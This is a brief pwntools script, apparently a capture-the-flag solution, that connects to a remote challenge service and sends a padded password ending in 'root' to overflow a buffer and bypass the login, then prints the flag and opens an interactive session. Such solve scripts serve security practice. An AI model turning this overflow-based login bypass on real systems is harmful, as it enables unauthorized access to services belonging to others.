from pwn import *

r = remote("host5.metaproblems.com", 5045)

r.sendlineafter(b"Username:", b"anything")
r.sendlineafter(b"Password:", b"cant_guess_thisaaaaaaaaaaaaaaaaaroot")

flag = r.recvline().decode().strip()
r.info(f"Flag: {flag}")

r.interactive()